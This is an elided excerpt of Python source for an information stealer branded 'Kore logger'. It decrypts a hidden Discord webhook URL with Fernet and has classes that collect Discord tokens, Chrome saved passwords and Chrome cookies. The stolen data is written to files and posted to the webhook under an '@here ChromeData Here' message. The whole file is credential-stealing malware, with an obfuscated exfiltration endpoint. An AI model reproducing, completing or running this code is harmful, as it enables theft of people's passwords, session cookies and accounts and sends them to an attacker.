...
WEBHOOK_URL = Fernet(b'9RWuyhGrtm6qtVgrUdgN3ZEccBJxrNzWAhps6KljVvk=').decrypt(b'gAAAAABiaX6NR7FaqMOQ0FL70Y3rYnG_NBPi2Wx2A-85RSS96WeqTSNDofrw2EgZeydOXJZUmZo7pm5J8J1S-gCJwB8GE0rKYo4Nu8BHGbeaELS1C2krT7DNil3Dp2wb8CfIr2bdtZUvvy9Rpy6jZOmrx9aRHWxGFOAY43UKmogN_6kBlmS-k-2czBUtFPtALYUZdMMkGqa6RnYKPFoN9f26kSpQyNblaNaGfqTsD5FKlBMNaLZHzM4=').decode()

def main(webhook_url):
    global webhook, embed

    webhook = Webhook.from_url(webhook_url, adapter=RequestsWebhookAdapter())
    embed = Embed(title="Kore gettin it all", color=000000)
    ...
    embed.set_footer(text="Kore logger | Made by Kore")
    embed.set_thumbnail(url="https://1tb.favim.com/preview/6/666/6664/66649/6664923.jpg")
    ...
    webhook.send(content="||@here|| ChromeData Here", embed=embed, file=file, avatar_url=" ", username="Kore")
...
class grabtokens():
    def __init__(self):
        ...
        self.tempfolder = os.getenv("temp")+"\\Kore_Logger"
...
class password():
    ...
    def grabPassword(self):
        ...
        with open("google-passwords.txt", "w") as f:
            f.write("Kore /// Google Chrome Passwords\n\n")
...
class cookiemonster:
    ...
    def grabCookies(self):
        ...
        with open(".\google-cookies.txt", "w", encoding="cp437", errors='ignore') as f:
            f.write("Kore /// Google Chrome Cookies\n\n")
